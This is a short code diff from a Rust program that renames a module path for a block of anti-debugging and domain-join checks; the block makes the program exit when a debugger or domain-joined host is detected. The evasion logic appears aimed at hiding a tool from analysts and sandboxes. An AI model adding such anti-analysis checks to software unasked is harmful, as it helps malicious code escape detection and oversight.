@@ -49,7 +49,7 @@ fn main() {
     // Anti-debug checks - runs all enabled checks
     #[cfg(any(feature = "CheckAntiDebugProcessDebugFlags", feature = "CheckAntiDebugSystemDebugControl", feature = "CheckAntiDebugRemoteDebugger", feature = "CheckAntiDebugNtGlobalFlag", feature = "CheckDomainJoined"))]
     {
-        if checks::checks::run_all_checks() {
+        if checks::wrapper::run_all_checks() {
             std::process::exit(1);
         }
     }
